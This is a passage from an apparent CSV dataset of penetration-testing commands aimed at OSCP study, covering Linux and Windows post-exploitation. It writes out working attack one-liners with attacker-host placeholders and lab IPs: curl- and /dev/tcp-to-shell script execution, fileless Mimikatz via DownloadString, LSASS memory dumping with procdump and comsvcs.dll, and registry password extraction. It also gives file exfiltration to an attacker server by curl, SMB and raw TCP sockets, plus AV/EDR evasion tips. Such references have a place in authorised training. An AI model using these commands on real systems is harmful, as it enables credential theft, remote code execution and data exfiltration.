~10 seconds to run.","high","","","","","{""/etc"": ""System configuration directory"", ""-type f"": ""Only files, not directories"", ""-perm -002"": ""World-writable permission bit"", ""-ls"": ""Long listing with permissions""}","","[""linux-find-world-writable"", ""linux-writable-passwd"", ""linux-test-file-writable""]","[""linux-test-file-writable""]"
"linux-linpeas-http","LinPEAS via HTTP Server","post-exploit","curl <LHOST>:<PORT>/linpeas.sh | sh","Execute LinPEAS via local HTTP server (most reliable transfer method)","linux","curl 192.168.45.155:443/linpeas.sh | sh","Prerequisites:
sudo python3 -m http.server <PORT> (in directory with linpeas.sh).

Most reliable method for OSCP.

~3-5 minute execution.","high","","","","","{""curl"": ""Download file via HTTP"", ""<LHOST>:<PORT>"": ""Attacker's HTTP server"", ""/linpeas.sh"": ""Path to LinPEAS script"", ""|"": ""Pipe to shell"", ""sh"": ""Execute script""}","[""python-http-server""]","[""linux-linpeas-nc"", ""linux-linpeas"", ""linux-unix-privesc-check-nc""]","[""linux-suid-find"", ""linux-sudo-check"", ""linux-cron-enum""]"
"linux-linpeas-nc","LinPEAS via Netcat","post-exploit","cat < /dev/tcp/<LHOST>/<PORT> | sh","Execute LinPEAS via netcat (no curl/wget required on victim)","linux","cat < /dev/tcp/192.168.45.155/443 | sh","Prerequisites:
sudo nc -q 5 -lvnp <PORT> < linpeas.sh.

Use when curl/wget unavailable.

Requires bash with /dev/tcp support.","high","","","","","{""cat <"": ""Read from input redirection"", ""/dev/tcp"": ""Bash built-in TCP connection"", ""|"": ""Pipe to shell"", ""sh"": ""Execute downloaded script""}","[""nc-file-transfer""]","[""linux-linpeas-http"", ""linux-linpeas"", ""linux-unix-privesc-check-nc""]","[""linux-suid-find"", ""linux-sudo-check"", ""linux-cron-enum""]"
"linux-linpeas-save-output","LinPEAS Save Output to File","post-exploit","curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh > <OUTPUT_FILE>","Run LinPEAS and save output to file for analysis (RAM-based recommended)","linux","curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh > /dev/shm/linpeas.txt","/dev/shm is RAM-based, files deleted on reboot.

Good for stealth.

Use 'less -r' to view with colors.","high","","","","","{""-L"": ""Follow redirects"", "">"": ""Redirect stdout to file"", ""/dev/shm"": ""RAM-based filesystem (no disk writes, stealthy)""}","[""linux-linpeas-http""]","[""linux-linpeas-http"", ""linux-linpeas"", ""linux-parse-linpeas-writable""]","[""linux-parse-linpeas-writable""]"
"linux-test-file-writable","Test if File is Writable","post-exploit","test -w <FILE> && echo 'Writable!' || echo 'Not writable'","Quick test if specific file is writable by current user","linux","test -w /etc/passwd && echo 'Writable!' || echo 'Not writable'","Common files to test:
/etc/passwd, /etc/shadow, /etc/sudoers, /root/.ssh/authorized_keys, service files in /etc/systemd/system","high","","","","","{""test -w"": ""Test if file is writable"", ""&&"": ""AND operator - run if test succeeds"", ""||"": ""OR operator - run if test fails"", ""echo"": ""Display result""}","","[""linux-writable-passwd"", ""linux-find-world-writable"", ""linux-find-writable-etc-focused""]",""
"linux-check-shadow-readable","Check if /etc/shadow is Readable","post-exploit","test -r /etc/shadow && echo 'Shadow is readable!' || echo 'Shadow not readable'","Check if /etc/shadow is readable (should be root-only, contains password hashes)","linux","","Readable /etc/shadow is major finding.

Extract and crack offline with john or hashcat.

Normal permissions:
-rw-r----- (640) owned by root:shadow","high","","","","","{""test -r"": ""Test if file is readable"", ""/etc/shadow"": ""Password hash file (should be -rw-r----- root shadow)"", ""&&"": ""Execute if test succeeds"", ""||"": ""Execute if test fails""}","","[""linux-find-world-writable"", ""linux-test-file-writable""]","[""john-crack"", ""hashcat-crack""]"
"linux-parse-linpeas-writable","Parse LinPEAS Output for World-Writable Files","post-exploit","grep -i 'world.*writable\|writable.*world' <OUTPUT_FILE>","Extract world-writable file findings from saved LinPEAS output","linux","grep -i 'world.*writable\|writable.*world' /dev/shm/linpeas.txt","Combine with other searches:
grep -iE 'world|writable|suid|sudo|password' <OUTPUT_FILE> | less","high","","","","","{""grep -i"": ""Case-insensitive search"", ""'world.*writable'"": ""Regex pattern matching 'world' followed by 'writable'"", ""\\|"": ""OR operator in regex"", ""<OUTPUT_FILE>"": ""File containing LinPEAS output""}","[""linux-linpeas-save-output""]","[""linux-find-world-writable"", ""linux-find-writable-etc-focused"", ""linux-linpeas-save-output""]","[""linux-find-world-writable""]"
"linux-find-writable-services-systemd","Find Writable Systemd Service Files","post-exploit","find /etc/systemd/system -writable -type f 2>/dev/null","Find systemd service files writable by current user (can modify to run commands as root)","linux","","Check if service runs as root before modifying.

Can also add [Install] WantedBy=multi-user.target for persistence.","medium","","","","","{""/etc/systemd/system"": ""Systemd service configuration directory"", ""-writable"": ""Find files writable by current user"", ""-type f"": ""Only files, not directories"", ""2>/dev/null"": ""Hide permission errors""}","","[""linux-writable-services"", ""linux-systemctl-privesc""]",""
"whoami-priv-backup","Check Backup and Debug Privileges","post-exploit","whoami /priv | findstr -i ""backup debug impersonate""","Check for SeBackupPrivilege, SeDebugPrivilege, and SeImpersonatePrivilege","","whoami /priv | findstr -i ""backup debug impersonate""","SeBackupPrivilege: Read any file (SAM extraction). SeDebugPrivilege: Debug processes (LSASS dump). SeImpersonatePrivilege: Token impersonation (Potato attacks).","high","","","","","","","",""
"systeminfo-version","Windows Version Information","post-exploit","systeminfo | findstr /B /C:""OS Name"" /C:""OS Version""","Get Windows OS name and version for exploit selection","","systeminfo | findstr /B /C:""OS Name"" /C:""OS Version""","Critical for privesc tool selection. Server 2019+ use PrintSpoofer/GodPotato. Server 2016 and earlier use JuicyPotato. Version determines available exploits.","high","","","","","","","",""
"wmic-os-version","WMIC OS Version Query","post-exploit","wmic os get caption,version","Get Windows version using WMI (alternative to systeminfo)","","wmic os get caption,version","Faster than systeminfo. Shows exact build number for kernel exploit selection. 10.0.17763 = Server 2019. 10.0.14393 = Server 2016.","high","","","","","","","",""
"spooler-status","Print Spooler Service Status","post-exploit","sc query spooler","Check if Print Spooler service is running (required for PrintSpoofer)","","sc query spooler","PrintSpoofer requires Spooler service running. If stopped/disabled, use GodPotato or SweetPotato instead. Post-PrintNightmare many environments disable Spooler.","high","","","","","","","",""
"hostname-domain","Hostname and Domain Info","post-exploit","hostname && echo %userdomain%","Get machine hostname and domain/workgroup name","","hostname && echo %userdomain%","Quick context check. Domain name needed for Impacket tools. WORKGROUP indicates standalone/not domain-joined.","medium","","","","","","","",""
"tasklist-lsass","Get LSASS Process ID","post-exploit","tasklist /fi ""imagename eq lsass.exe""","Find LSASS process ID for memory dump extraction","","tasklist /fi ""imagename eq lsass.exe""","PID needed for comsvcs.dll MiniDump. LSASS typically PID 500-800. Use PID with: rundll32 comsvcs.dll, MiniDump <PID> lsass.dmp full","high","","","","","","","",""
"netcat-upload","Certutil Download Netcat","post-exploit","certutil -urlcache -f http://<LHOST>/nc.exe C:\Windows\Temp\nc.exe","Download netcat to target using certutil (built-in Windows tool)","","certutil -urlcache -f http://10.10.14.5/nc.exe C:\Windows\Temp\nc.exe","Living-off-the-land download. Start web server first: python3 -m http.server 80. Alternative: PowerShell IWR, bitsadmin, or SMB copy.","high","","","","","{""-urlcache"": ""Use URL cache mode"", ""-f"": ""Force overwrite existing file""}","","",""
"certutil-download","Certutil Download File","post-exploit","certutil -urlcache -f http://<LHOST>/<FILE> <DEST_PATH>","Download any file to target using certutil","","certutil -urlcache -f http://10.10.14.5/PrintSpoofer64.exe C:\Windows\Temp\ps.exe","Universal Windows download method. Works on most Windows versions. May trigger AV if downloading known tools - consider renaming.","high","","","","","","","",""
"invoke-mimikatz-remote","Remote Mimikatz Credential Dump","post-exploit","Invoke-Command -ComputerName <TARGET> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<MIMIKATZ_SCRIPT>'); Invoke-Mimikatz -Command '""privilege::debug"" ""sekurlsa::logonpasswords""' }","Execute Mimikatz remotely via PowerShell remoting.
Dump credentials from LSASS memory without uploading files.","","Invoke-Command -ComputerName WORKSTATION05.corp.com -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '""privilege::debug"" ""sekurlsa::logonpasswords""' }","Fileless credential dumping via PowerShell remoting.

Advantages:
(1) No disk writes (bypasses some AV), (2) Remote execution (don't need interactive access), (3) Returns credentials to your console.

Prerequisites:
(1) Local admin on target, (2) WinRM enabled (Test-WSMan), (3) Web server hosting Invoke-Mimikatz.ps1.

Modern Windows (10+/2016+) has WDigest disabled by default (no plaintext passwords) - you'll get NTLM hashes only.

Use pass-the-hash with these hashes.

Target logged-on users:
Domain Admins, service accounts, other privileged accounts.

OSCP:
After finding admin sessions via Get-NetSession/Get-NetLoggedon, use this to dump those credentials remotely.

Operational security:
Mimikatz is LOUD (triggers AV/EDR) - use only when necessary.

Alternative:
procdump + pypykatz (stealthier).","high","","","","{""ERROR kuhl_m_sekurlsa_acquireLSA"": ""SeDebugPrivilege not available OR running as non-admin. Ensure Invoke-Command runs as SYSTEM: Invoke-Command -ComputerName <TARGET> -ScriptBlock { ... } -Credential (Get-Credential)"", ""Access is denied"": ""Need local admin on target. Verify: Test-Path \\\\<TARGET>\\C$"", ""Invoke-Mimikatz not recognized"": ""Script download failed. Check web server: python3 -m http.server 80. Test from target: (New-Object Net.WebClient).DownloadString('http://<LHOST>/<SCRIPT>')"", ""AV/EDR detection"": ""Mimikatz heavily signatured. Use obfuscated version OR alternative: procdump.exe -ma lsass.exe lsass.dmp (then pypykatz on Kali)""}","{""Invoke-Command"": ""Execute PowerShell on remote system via WinRM"", ""IEX (New-Object Net.WebClient).DownloadString()"": ""Download and execute PowerShell script from web server in memory (fileless)"", ""privilege::debug"": ""Enable SeDebugPrivilege token (required to access LSASS process)"", ""sekurlsa::logonpasswords"": ""Extract plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS memory""}","[""python-http-server"", ""test-wsman-connectivity""]","[""procdump-lsass"", ""comsvcs-lsass-dump""]",""
"procdump-lsass","Dump LSASS Memory with ProcDump","post-exploit","procdump.exe -accepteula -ma lsass.exe <OUTPUT_FILE>","Create memory dump of LSASS process using Sysinternals ProcDump.
Dump can be parsed offline with pypykatz or Mimikatz.","","procdump.exe -accepteula -ma lsass.exe lsass.dmp","Stealthier alternative to Mimikatz - ProcDump is a legitimate Microsoft Sysinternals tool (less likely to trigger AV).

Workflow:
(1) Upload procdump.exe to target (copy procdump.exe \\<TARGET>\C$\Temp\), (2) Execute via PsExec/WMI, (3) Download dump file, (4) Parse offline on Kali.

LSASS (Local Security Authority Subsystem Service) stores credentials in memory for SSO.

Dump contains:
NTLM hashes, Kerberos tickets (TGT/TGS), plaintext passwords (if WDigest enabled), cached domain credentials.

Parsing tools:
pypykatz (Python, Kali), Mimikatz (Windows), secretsdump.py (Impacket).

OSCP:
Preferred method when Mimikatz is blocked - procdump + pypykatz is quieter.

Download ProcDump:
https://live.sysinternals.com/procdump.exe","high","","","","{""Access denied"": ""Need local admin OR SeDebugPrivilege. Run from elevated PowerShell OR as SYSTEM: PsExec.exe -s -i procdump.exe ..."", ""Error writing dump"": ""Insufficient disk space. LSASS dumps are 50-200MB. Check: wmic logicaldisk get freespace"", ""Process not found"": ""lsass.exe protected by PPL (Protected Process Light) on Windows 10 1607+. Workaround: Disable PPL via registry (requires reboot) OR use comsvcs.dll method"", ""AV deletion"": ""Some AV/EDR delete .dmp files. Use alternate extension: procdump.exe -ma lsass.exe lsass.bin""}","{""-accepteula"": ""Auto-accept Sysinternals EULA (suppress GUI prompt)"", ""-ma"": ""Full memory dump (include all process memory, not just stack/heap)"", ""lsass.exe"": ""Target process name. Can also use PID: procdump.exe -accepteula -ma <PID> <OUTPUT>""}","","[""invoke-mimikatz-remote"", ""comsvcs-lsass-dump""]",""
"pypykatz-parse","Parse LSASS Dump with pypykatz","post-exploit","pypykatz lsa minidump <DUMP_FILE>","Parse LSASS memory dump offline to extract credentials.
Extract NTLM hashes, Kerberos tickets, and plaintext passwords.
Pure Python alternative to Mimikatz.","","pypykatz lsa minidump lsass.dmp","Pure Python LSASS parser - runs on Linux (Kali).

Advantages over Mimikatz:
(1) Offline parsing (no risk on target), (2) Runs on Linux (no Windows needed), (3) Supports multiple output formats (text, JSON, Kerberos ticket extraction).

Credentials extracted:
(1) NTLM hashes (always present for logged-on users), (2) Plaintext passwords (only if WDigest enabled - disabled by default on Win10+/2016+), (3) Kerberos tickets (TGT/TGS for active sessions), (4) Cached domain credentials.

OSCP workflow:
(1) Dump LSASS on target (procdump/comsvcs), (2) Transfer dump to Kali, (3) Parse with pypykatz, (4) Extract hashes, (5) Pass-the-hash or crack offline.

Modern Windows protection:
Credential Guard (encrypts LSASS memory) prevents credential extraction - pypykatz will show encrypted blobs instead of cleartext.","high","","","","{""pypykatz not found"": ""Install: pip3 install pypykatz OR apt install pypykatz"", ""Failed to parse"": ""Corrupted dump OR incomplete dump. Re-dump LSASS with: procdump.exe -ma lsass.exe lsass.dmp"", ""No credentials found"": ""Dump successful but no cached credentials at time of dump. Target users logged out OR credentials cleared."", ""Invalid dump file"": ""Wrong file type. Ensure dump is from procdump -ma, comsvcs.dll, or Task Manager (full dump, not mini).""}","{""lsa"": ""Parse LSA (Local Security Authority) secrets"", ""minidump"": ""Parse Windows minidump format (procdump output)"", ""-o"": ""Output to file instead of console: pypykatz lsa minidump <DUMP_FILE> -o output.txt"", ""--json"": ""Output in JSON format for programmatic parsing: pypykatz lsa minidump <DUMP_FILE> --json""}","","[""secretsdump-hashes""]",""
"comsvcs-lsass-dump","Dump LSASS with comsvcs.dll","post-exploit","rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> <OUTPUT_FILE> full","Create LSASS memory dump using built-in Windows comsvcs.dll.
No external tools required - native LOLBin technique.","","rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Temp\lsass.dmp full","Living-off-the-land (LOLBin) technique using native Windows DLL.

Advantages:
(1) No external tools needed (comsvcs.dll always present), (2) Signed Microsoft binary (less suspicious), (3) Works identically to procdump.

Get LSASS PID:
PowerShell:
(Get-Process lsass).Id OR cmd:
tasklist /fi ""imagename eq lsass.exe"".

comsvcs.dll's MiniDump function is legitimate crash dump API - used by Windows Error Reporting.

Attackers abuse it for LSASS dumping.

Modern detection:
EDR monitors comsvcs.dll calls to lsass.exe PID.

OSCP:
Preferred when procdump unavailable or blocked - native Windows technique, no upload required.

One-liner with PID resolution:
PowerShell:
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full","high","","","","{""Access denied"": ""Need local admin OR SeDebugPrivilege. Run from elevated cmd/PowerShell."", ""Invalid parameter"": ""LSASS PID incorrect. Get PID: tasklist /fi \""imagename eq lsass.exe\"" (shows PID column)"", ""Path not found"": ""Output directory doesn't exist. Create first: mkdir C:\\Temp"", ""AV detection"": ""Some EDR monitors comsvcs.dll MiniDump calls. Use procdump if this fails."", ""Protected process"": ""LSASS protected by PPL (Protected Process Light) on modern Windows. Disable PPL via registry (requires reboot) OR use vulnerability to bypass.""}","{""rundll32.exe"": ""Windows utility to execute DLL functions"", ""comsvcs.dll"": ""COM+ Services DLL - contains MiniDump export for crash dump creation"", ""MiniDump"": ""Exported function in comsvcs.dll that creates process memory dumps"", ""full"": ""Dump type - full memory dump (includes all process memory)""}","","[""procdump-lsass"", ""invoke-mimikatz-remote""]",""
"ps-get-process-owner","Get Process Owner (PowerShell)","enumeration","Get-WmiObject -Class Win32_Process -Filter ""name='<PROCESS_NAME>'"" | Select-Object Name, ProcessId, @{Name='Owner';Expression={$_.GetOwner().User}}","Identify which user account owns running processes.
Useful for finding service account processes to inject into.","","Get-WmiObject -Class Win32_Process -Filter ""name='sqlservr.exe'"" | Select-Object Name, ProcessId, @{Name='Owner';Expression={$_.GetOwner().User}}","Identify which user account runs specific processes.

Use case:
You compromised 'sqlservice' account and want to find where it's actively running (not just sessions).

If you find sqlservr.exe (SQL Server) running as sqlservice, you can:
(1) Inject into that process (becomes sqlservice context), (2) Access resources as sqlservice (files, registry, network).

Alternative:
tasklist /v shows owner but requires admin.

This WMI method also requires admin but provides programmatic access.

OSCP:
Use after compromising service account - find where it runs, target those processes for code execution.","medium","","","","{""Access denied"": ""Need local admin to query process owners. Run from elevated PowerShell."", ""No processes found"": ""Process name incorrect. List all: Get-Process OR tasklist"", ""Owner field empty"": ""Process is SYSTEM or protected. Owner will show for user-owned processes only.""}","{""Get-WmiObject -Class Win32_Process"": ""Query WMI for process information"", ""-Filter"": ""Filter processes by name"", ""GetOwner()"": ""WMI method to retrieve process owner (username)""}","","[""win-tasklist-verbose""]",""
"file-transfer-python-http","Python HTTP Server (Download from Target)","post-exploit","python3 -m http.server <PORT>","Start HTTP server on attacker machine for file downloads","exfiltration","python3 -m http.server 8000","Run in directory containing files to transfer","high","","","","","{""-m http.server"": ""Run HTTP server module"", ""PORT"": ""Port to listen on (default 8000)""}","","[""exfil-uploadserver""]","[""file-transfer-wget"", ""file-transfer-curl"", ""file-transfer-powershell-download"", ""file-transfer-certutil""]"
"file-transfer-wget","Linux: wget Download","post-exploit","wget http://<LHOST>:<PORT>/<FILE> -O <OUTPUT>","Download file using wget on Linux target","exfiltration","wget http://10.10.14.5:8000/linpeas.sh -O /tmp/linpeas.sh","Add --no-check-certificate for HTTPS without valid cert","high","","","","","{""-O"": ""Output file name"", ""-q"": ""Quiet mode (suppress output)"", ""--no-check-certificate"": ""Skip SSL certificate validation""}","[""file-transfer-python-http""]","[""file-transfer-curl"", ""bash-dev-tcp-download"", ""file-transfer-nc-push""]","[""linpeas-run"", ""linux-enum-users-shells"", ""check-sudo-privs""]"
"file-transfer-curl","Linux: curl Download","post-exploit","curl http://<LHOST>:<PORT>/<FILE> -o <OUTPUT>","Download file using curl on Linux target","exfiltration","curl http://10.10.14.5:8000/exploit.sh -o /tmp/exploit.sh","curl -L follows redirects, useful for shortened URLs","high","","","","","{""-o"": ""Output file name"", ""-k"": ""Allow insecure SSL connections"", ""-s"": ""Silent mode"", ""-L"": ""Follow redirects""}","[""file-transfer-python-http""]","[""file-transfer-wget"", ""file-transfer-dev-tcp""]","[""linux-privesc-linenum"", ""linux-privesc-linpeas""]"
"file-transfer-certutil","Windows: certutil Download","post-exploit","certutil -urlcache -f http://<LHOST>:<PORT>/<FILE> <OUTPUT>","Download file using certutil (Windows native tool)","exfiltration","certutil -urlcache -f http://10.10.14.5:8000/nc.exe C:\\temp\\nc.exe","Native Windows tool, often bypasses basic restrictions","high","","","","","{""-urlcache"": ""Use URL cache"", ""-f"": ""Force overwrite existing file"", ""-split"": ""Download and split file""}","","[""bitsadmin-download""]",""
"file-transfer-powershell-download","Windows: PowerShell Download File","post-exploit","powershell -c ""(New-Object System.Net.WebClient).DownloadFile('http://<LHOST>:<PORT>/<FILE>', '<OUTPUT>')""","Download file using PowerShell WebClient","exfiltration","powershell -c ""(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5:8000/payload.exe', 'C:\\temp\\payload.exe')""","Add -ep bypass if execution policy blocks:
powershell -ep bypass -c ""...""","high","","","","","{""-c"": ""Execute command"", ""New-Object System.Net.WebClient"": ""Create web client object"", ""DownloadFile"": ""Method to download file""}","[""file-transfer-python-http""]","[""file-transfer-certutil"", ""file-transfer-bitsadmin""]","[""win-privesc-powerup"", ""winpeas-run""]"
"file-transfer-scp","Linux: SCP Transfer","post-exploit","scp <FILE> <USER>@<TARGET>:<DEST>","Securely copy file to target via SSH","exfiltration","scp /tmp/exploit.sh user@192.168.45.100:/tmp/exploit.sh","Requires SSH access to target","medium","","","","","{""-P"": ""Specify SSH port (if not 22)"", ""-i"": ""Use specific SSH key"", ""-r"": ""Recursively copy directory""}","","",""
"file-transfer-smb","Windows: SMB Transfer","post-exploit","copy \\<LHOST>\<SHARE>\<FILE> <DEST>","Copy file from SMB share on attacker machine","exfiltration","copy \\10.10.14.5\share\nc.exe C:\\temp\\nc.exe","Setup SMB server:
impacket-smbserver share $(pwd) -smb2support -username user -password pass","high","","","","","{""\\\\\\\\"": ""UNC path format"", ""net use"": ""Map network drive if needed""}","","[""file-transfer-powershell-download"", ""file-transfer-certutil""]","[""win-privesc-powerup"", ""winpeas-run""]"
"file-transfer-nc-push","Netcat: Push File to Target","post-exploit","nc -lvnp <PORT> < <FILE>","Push file to target using netcat (target connects)","exfiltration","nc -lvnp 4444 < exploit.sh","Target command: nc <LHOST> <PORT> > output_file","high","","","","","{""-l"": ""Listen mode"", ""-v"": ""Verbose output"", ""-n"": ""No DNS resolution"", ""-p"": ""Specify port"", ""<"": ""Redirect file as input""}","","[""file-transfer-nc-pull"", ""file-transfer-curl"", ""file-transfer-wget""]","[""linpeas-run"", ""check-sudo-privs""]"
"file-transfer-nc-pull","Netcat: Pull File from Target","post-exploit","nc -lvnp <PORT> > <FILE>","Receive file from target using netcat","exfiltration","nc -lvnp 4444 > data.txt","Target sends with:
nc <LHOST> <PORT> < file_to_send","medium","","","","","{""-l"": ""Listen mode"", ""-v"": ""Verbose"", ""-n"": ""Numeric IPs only"", ""-p"": ""Port"", "">"": ""Redirect output to file""}","","",""
"file-transfer-base64","Base64 Encode/Decode Transfer","post-exploit","base64 <FILE> | nc <TARGET> <PORT>","Transfer file encoded as base64 (safe for text channels)","exfiltration","base64 payload.exe | nc 192.168.45.100 4444","Windows decode:
certutil -decode input.b64 output.exe","medium","","","","","{""base64"": ""Encode file to base64"", ""|"": ""Pipe to netcat"", ""base64 -d"": ""Decode base64 (on target)""}","","",""
"file-transfer-php","PHP Upload Script","post-exploit","echo '<?php file_put_contents($_FILES[""file""][""name""], file_get_contents($_FILES[""file""][""tmp_name""])); ?>' > upload.php","Create simple PHP upload handler on target web server","exfiltration","","Place in web-accessible directory, use curl -F to upload","medium","","","","","{""file_put_contents"": ""Write file to disk"", ""$_FILES"": ""Access uploaded file"", ""tmp_name"": ""Temporary upload location""}","","",""
"file-transfer-ftp","FTP Transfer","post-exploit","ftp <TARGET>","Transfer files via FTP (if FTP server available)","exfiltration","ftp 192.168.45.100","Setup FTP server: python -m pyftpdlib -p 21 -w","low","","","","","{""binary"": ""Set binary transfer mode"", ""get"": ""Download file from server"", ""put"": ""Upload file to server"", ""mget"": ""Download multiple files""}","","",""
"file-transfer-bitsadmin","Windows: bitsadmin Download","post-exploit","bitsadmin /transfer job /download /priority high http://<LHOST>:<PORT>/<FILE> <OUTPUT>","Download file using Windows BITS service","exfiltration","bitsadmin /transfer job /download /priority high http://10.10.14.5:8000/payload.exe C:\\temp\\payload.exe","BITS runs in background, can be slower than certutil","medium","","","","","{""/transfer"": ""Create transfer job"", ""/download"": ""Download mode"", ""/priority high"": ""High priority transfer""}","","",""
"file-transfer-dev-tcp","Linux: /dev/tcp Download","post-exploit","cat < /dev/tcp/<LHOST>/<PORT> > <OUTPUT>","Download file using bash /dev/tcp (no external tools needed)","exfiltration","cat < /dev/tcp/10.10.14.5/4444 > /tmp/file","Works when wget/curl unavailable; requires bash with /dev/tcp enabled","medium","","","","","{""/dev/tcp"": ""Bash TCP pseudo-device"", ""cat <"": ""Read from TCP connection"", ""> file"": ""Write to output file""}","","",""
"exfil-uploadserver","Python Upload Server (Kali)","post-exploit","python3 -m uploadserver <PORT>","Start HTTP server that accepts file uploads from target","exfiltration","python3 -m uploadserver 80","Install with:
pip3 install uploadserver; supports POST uploads","high","","","","","{""-m uploadserver"": ""Run uploadserver module"", ""PORT"": ""Default 8000 if not specified"", ""--directory"": ""Save uploads to specific directory""}","","[""file-transfer-python-http"", ""exfil-smb-upload""]",""
"exfil-powershell-upload","Windows: PowerShell Upload File","post-exploit","powershell -c ""Invoke-RestMethod -Uri http://<LHOST>:<PORT>/upload -Method Post -InFile '<FILE>'""","Upload file from Windows target to attacker's uploadserver","exfiltration","powershell -c ""Invoke-RestMethod -Uri http://10.10.14.5:80/upload -Method Post -InFile 'C:\Users\user\Desktop\data.zip'""","Add -ep bypass if execution policy blocks:
powershell -ep bypass -c ""...""","high","","","","","{""-c"": ""Execute command"", ""Invoke-RestMethod"": ""PowerShell web request cmdlet"", ""-Uri"": ""Target URL"", ""-Method Post"": ""HTTP POST method"", ""-InFile"": ""File to upload""}","[""exfil-uploadserver""]","[""exfil-smb-upload"", ""exfil-nc-tcp-upload"", ""exfil-powershell-base64""]",""
"exfil-smb-upload","Windows: Upload via SMB Share","post-exploit","copy ""<FILE>"" \\<LHOST>\<SHARE>\","Upload file from Windows target to Kali SMB share","exfiltration","copy ""C:\Users\user\Desktop\data.zip"" \\10.10.14.5\share\","Fastest method for large files; requires port 445 open","high","","","","{""Network path not found"": ""Firewall blocking port 445. Use: exfil-powershell-upload"", ""Access denied"": ""Add auth to SMB server: -username user -password pass""}","{""copy"": ""Windows native copy command"", ""\\\\\\\\<LHOST>\\\\<SHARE>"": ""UNC path to SMB share"", ""Quotes"": ""Required for paths with spaces""}","","[""exfil-powershell-upload"", ""exfil-nc-tcp-upload""]",""
"exfil-nc-tcp-upload","PowerShell: TCP Upload via Socket","post-exploit","$client = New-Object System.Net.Sockets.TcpClient('<LHOST>',<PORT>); $stream = $client.GetStream(); $data = [IO.File]::ReadAllBytes('<FILE>'); $stream.Write($data, 0, $data.Length); $stream.Close(); $client.Close()","Upload file using raw TCP socket (works when HTTP/SMB blocked)","exfiltration","$client = New-Object System.Net.Sockets.TcpClient('10.10.14.5',4444); $stream = $client.GetStream(); $data = [IO.File]::ReadAllBytes('C:\Users\user\Desktop\data.zip'); $stream.Write($data, 0, $data.Length); $stream.Close(); $client.Close()","Loads entire file to memory; not suitable for files >1GB","high","","","","","{""TcpClient"": ""Opens TCP connection"", ""ReadAllBytes"": ""Loads file into memory"", ""Write"": ""Sends data over TCP stream"", ""Close"": ""Closes connection and stream""}","","[""file-transfer-nc-pull"", ""exfil-powershell-upload""]",""
"exfil-powershell-base64","PowerShell: Base64 Encode File","post-exploit","[Convert]::ToBase64String([IO.File]::ReadAllBytes('<FILE>'))","Encode file to base64 for copy/paste exfiltration","exfiltration","[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\user\Desktop\data.txt'))","Only practical for files <1MB; output is ~33% larger than original","medium","","","","","{""ReadAllBytes"": ""Read file as byte array"", ""ToBase64String"": ""Convert bytes to base64 text"", ""Out-File"": ""Save output to file (optional)""}","","[""file-transfer-base64"", ""exfil-powershell-upload""]",""
"exfil-curl-upload","Linux: Curl Upload File","post-exploit","curl -X POST -F file=@<FILE> http://<LHOST>:<PORT>/upload","Upload file from Linux target to uploadserver","exfiltration","curl -X POST -F file=@/etc/passwd http://10.10.14.5:80/upload","Requires uploadserver or similar HTTP upload handler","high","","","","","{""-X POST"": ""Use POST method"", ""-F file=@"": ""Form upload with file"", ""@"": ""Read from file"", ""-k"": ""Allow insecure SSL""}","[""exfil-uploadserver""]","[""file-transfer-nc-pull"", ""file-transfer-scp""]",""
"ps-registry-autologon","PowerShell Registry AutoLogon Credential Extraction","post-exploit","Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select-Object DefaultUserName,DefaultPassword,DefaultDomainName","One-liner commands to extract cleartext credentials from Windows Registry AutoLogon keys","CREDENTIAL_HARVESTING","","","","[{""command"": ""Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' | Select-Object DefaultUserName,DefaultPassword,DefaultDomainName"", ""description"": ""Extract AutoLogon credentials (username, password, domain) from registry"", ""context"": ""Credential harvesting from registry AutoLogon configuration""}, {""command"": ""reg query \""HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" /v DefaultPassword"", ""description"": ""Alternative using reg.exe to query DefaultPassword value directly"", ""context"": ""Non-PowerShell equivalent using cmd.exe""}, {""command"": ""(Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon').DefaultPassword"", ""description"": ""Extract only the DefaultPassword value (returns plaintext password)"", ""context"": ""Quick password extraction without formatting""}, {""command"": ""Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' | Format-List Default*"", ""description"": ""List all properties starting with 'Default' (includes AutoAdminLogon, DefaultUserName, DefaultPassword, DefaultDomainName)"", ""context"": ""Comprehensive AutoLogon configuration review""}]","{""purpose"": ""Extract cleartext credentials stored in Windows Registry when AutoLogon is enabled - common misconfiguration in corporate environments"", ""manual_alternative"": ""GUI: Run regedit.exe \u2192 Navigate to HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon \u2192 View DefaultPassword key (impractical via reverse shell)"", ""common_failures"": [""DefaultPassword key not present - AutoLogon disabled or not configured"", ""AutoAdminLogon value is 0 - AutoLogon feature disabled"", ""Access denied - requires at least user-level privileges (not SYSTEM-only)"", ""Empty DefaultPassword - credentials removed or never set""], ""when_to_use"": [""After gaining initial user or SYSTEM access on Windows workstation/server"", ""Automated post-exploitation credential harvesting phase"", ""When searching for lateral movement or privilege escalation credentials"", ""OSCP lab environments often have AutoLogon configured for convenience""], ""exam_relevance"": ""MEDIUM - AutoLogon misconfigurations appear in OSCP labs. Credentials often enable lateral movement or provide admin access."", ""time_estimate"": ""<5 seconds"", ""technical_notes"": [""AutoLogon stores credentials in HKLM (Local Machine hive) - accessible to all users"", ""DefaultPassword is REG_SZ (string) value containing plaintext password"", ""AutoAdminLogon=1 indicates AutoLogon is enabled"", ""DefaultDomainName may be blank (local account) or contain domain name"", ""Alternative locations: 